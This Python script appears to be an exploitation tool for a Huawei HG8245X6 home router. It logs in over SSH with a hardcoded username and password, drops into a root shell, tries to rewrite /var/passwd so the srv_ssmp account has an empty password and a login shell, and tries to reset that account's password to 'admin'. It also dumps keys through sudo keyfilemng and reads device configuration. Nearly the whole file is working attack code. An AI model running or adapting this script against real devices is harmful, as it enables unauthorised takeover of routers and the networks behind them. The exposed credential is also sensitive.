#!/usr/bin/env python3
"""
Phase 5: Final escalation to srv_ssmp.
Key findings:
- /etc/passwd -> /var/passwd (writable symlink target?)
- sudo keyfilemng, sudo reboot available
- FT_SSMP_WEB_LOGIN_WITHOUT_PWD enabled in TELECOM_ft.cfg
- /var/passwd is the actual passwd file target
Strategy:
  1. Try writing to /var/passwd (add srv_ssmp with no password)
  2. Try su-ing via modified passwd
  3. Use keyfilemng to get keys
  4. Use procmonitor/comm to restart ssmp as different UID
"""

import paramiko
import time

HOST = "192.168.1.1"
USER = "sUser"
PASSWORD = "EP!99R4HLH9E"

def recv_until(chan, markers, timeout=10):
    if isinstance(markers, str):
        markers = [markers]
    buf = b""
    start = time.time()
    while time.time() - start < timeout:
        if chan.recv_ready():
            chunk = chan.recv(4096)
            buf += chunk
            decoded = buf.decode('utf-8', errors='replace')
            for marker in markers:
                if marker in decoded:
                    return decoded
        elif chan.exit_status_ready():
            break
        time.sleep(0.1)
    return buf.decode('utf-8', errors='replace')

def send_cmd(chan, cmd, marker="# ", timeout=20, show=True):
    chan.send(cmd + "\n")
    out = recv_until(chan, [marker, "WAP>", "SU_WAP>", "$ ", "Password:"], timeout)
    if show:
        lines = [l.strip() for l in out.strip().split('\n') if l.strip()]
        for l in lines:
            if cmd[:25] not in l:
                print(f"  {l}")
    return out

def connect_and_shell():
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(HOST, username=USER, password=PASSWORD, timeout=10,
                   look_for_keys=False, allow_agent=False)
    chan = client.invoke_shell(width=220, height=50)
    time.sleep(2)
    out = recv_until(chan, ["WAP>", "Remove one session", "Enter the ID"], timeout=8)
    if "Remove one session" in out or "Enter the ID" in out:
        print("[!] Session limit - removing session 1...")
        chan.send("1\n")
        time.sleep(2)
        recv_until(chan, "WAP>", timeout=10)
    chan.send("su\n")
    recv_until(chan, ["SU_WAP>", "success"], timeout=8)
    chan.send("shell\n")
    recv_until(chan, "# ", timeout=8)
    print("[+] Shell obtained!\n")
    return client, chan

def main():
    print("=" * 62)
    print("  HG8245X6 - Final srv_ssmp Escalation Attempt")
    print("=" * 62)

    client, chan = connect_and_shell()

    # ── 1. Check /var/passwd write access ─────────────────────
    print("[*] /var/passwd details and content:")
    send_cmd(chan, "ls -la /var/passwd")
    send_cmd(chan, "cat /var/passwd 2>&1")

    # ── 2. Check if we can write to /var/passwd ───────────────
    print("\n[*] Testing write access to /var/passwd:")
    send_cmd(chan, "touch /var/passwd_test 2>&1 && echo WRITE_OK || echo WRITE_DENIED")
    send_cmd(chan, "rm -f /var/passwd_test 2>&1")

    # ── 3. Check if we can cp /var/passwd and replace ──────────
    print("\n[*] Current srv_ssmp entry in /var/passwd:")
    send_cmd(chan, "grep srv_ssmp /var/passwd")

    # ── 4. Try writing a modified passwd to give srv_ssmp an empty password ─
    print("\n[*] Attempting to patch /var/passwd (add shell to srv_ssmp):")
    # Backup first
    send_cmd(chan, "cp /var/passwd /tmp/passwd_backup 2>&1 && echo BACKUP_OK")
    # Modify: change srv_ssmp shell from /bin/false to /bin/sh and clear password
    send_cmd(chan, "sed 's|srv_ssmp:x:3008|srv_ssmp::3008|; s|srv_ssmp:/bin/false|srv_ssmp:/bin/sh|' /var/passwd > /tmp/new_passwd 2>&1")
    send_cmd(chan, "cat /tmp/new_passwd | grep srv_ssmp")
    # Try to replace
    send_cmd(chan, "cp /tmp/new_passwd /var/passwd 2>&1 && echo REPLACE_OK || echo REPLACE_DENIED")
    # Test su now
    print("\n[*] Testing su srv_ssmp after passwd patch:")
    chan.send("su srv_ssmp\n")
    out = recv_until(chan, ["Password", "# ", "$ ", "srv_ssmp"], timeout=5)
    print(f"  {out.strip()[-200:]}")
    if "Password" in out:
        chan.send("\n")  # blank password
        out = recv_until(chan, ["# ", "$ ", "incorrect", "srv_ssmp"], timeout=5)
        print(f"  {out.strip()}")
        if "incorrect" not in out.lower():
            print("  [+] SUCCESS! We are srv_ssmp!")
            send_cmd(chan, "id")
            send_cmd(chan, "cat /proc/self/status | grep -E 'Uid|Gid'")
    elif "# " in out or "$ " in out:
        print("  [+] Shell obtained without password!")
        send_cmd(chan, "id")

    # ── 5. Restore passwd if we broke it ──────────────────────
    send_cmd(chan, "cp /tmp/passwd_backup /var/passwd 2>/dev/null; echo RESTORED")

    # ── 6. keyfilemng approach ────────────────────────────────
    print("\n[*] Using sudo keyfilemng (allowed by sudoers):")
    send_cmd(chan, "sudo /bin/keyfilemng check 2>&1")
    send_cmd(chan, "sudo /bin/keyfilemng save 2>&1")
    send_cmd(chan, "ls -la /tmp/keys* /var/keys* /etc/keys* 2>/dev/null | head -10")

    # ── 7. Check TELECOM_ft.cfg for login-without-pwd feature ─
    print("\n[*] TELECOM_ft.cfg (login-without-password feature):")
    send_cmd(chan, "cat /etc/wap/customize/common/TELECOM_ft.cfg 2>&1 | grep -A2 -B2 'WEB_LOGIN_WITHOUT'")

    # ── 8. Try using ubus (allowed by sudo) to call ssmp RPC ──
    print("\n[*] sudo ubus to communicate with ssmp:")
    send_cmd(chan, "sudo /bin/ubus list 2>&1 | head -20")
    send_cmd(chan, "sudo /bin/ubus call ssmp.user getall 2>&1 | head -20", timeout=10)

    # ── 9. Check /var/srv_ssmp filesystem ─────────────────────
    print("\n[*] /var/srv_ssmp directory:")
    send_cmd(chan, "ls -la /var/srv_ssmp/ 2>&1 | head -30")
    send_cmd(chan, "find /var/srv_ssmp -type f 2>/dev/null | head -20", timeout=10)

    # ── 10. Read ssmp appconfig ───────────────────────────────
    print("\n[*] ssmp appconfig.ini:")
    send_cmd(chan, "cat /etc/app/ssmp_app/appconfig.ini 2>&1")

    # ── 11. Try changing passwd via WAP CLI mode ──────────────
    print("\n[*] Checking WAP CLI passwd command:")
    chan.send("exit\n")  # exit shell
    recv_until(chan, "SU_WAP>", timeout=5)
    chan.send("passwd srv_ssmp\n")
    out = recv_until(chan, ["new password", "Password", "SU_WAP>", "WAP>", "passwd"], timeout=8)
    print(f"  [SU_WAP] passwd cmd: {out.strip()[-300:]}")
    if "new password" in out.lower() or "new Password" in out:
        print("  [+] passwd command accepted! Setting password to 'admin'...")
        chan.send("admin\n")
        out = recv_until(chan, ["Retype", "confirm", "SU_WAP>", "again"], timeout=5)
        print(f"  {out.strip()}")
        chan.send("admin\n")
        out = recv_until(chan, ["SU_WAP>", "changed", "success"], timeout=5)
        print(f"  {out.strip()}")
        
        # Now go back to shell and try su
        chan.send("shell\n")
        recv_until(chan, "# ", timeout=5)
        chan.send("su srv_ssmp\n")
        out = recv_until(chan, ["Password", "# ", "$ "], timeout=5)
        print(f"  su result: {out.strip()}")
        if "Password" in out:
            chan.send("admin\n")
            out = recv_until(chan, ["# ", "$ ", "incorrect"], timeout=5)
            print(f"  {out.strip()}")
            if "incorrect" not in out.lower():
                print("  [+] GOT srv_ssmp SHELL!")
    else:
        print("  [-] WAP passwd command not available or different syntax")
        # Go back to shell
        chan.send("shell\n")
        recv_until(chan, "# ", timeout=5)

    # ── 12. Check ubus for ssmp services ─────────────────────
    print("\n[*] Available ubus objects for ssmp:")
    send_cmd(chan, "sudo /bin/ubus list 2>&1 | grep -i ssmp | head -20")
    send_cmd(chan, "sudo /bin/ubus list 2>&1 | head -30")

    client.close()
    print("\n[*] Session closed.")

if __name__ == "__main__":
    main()
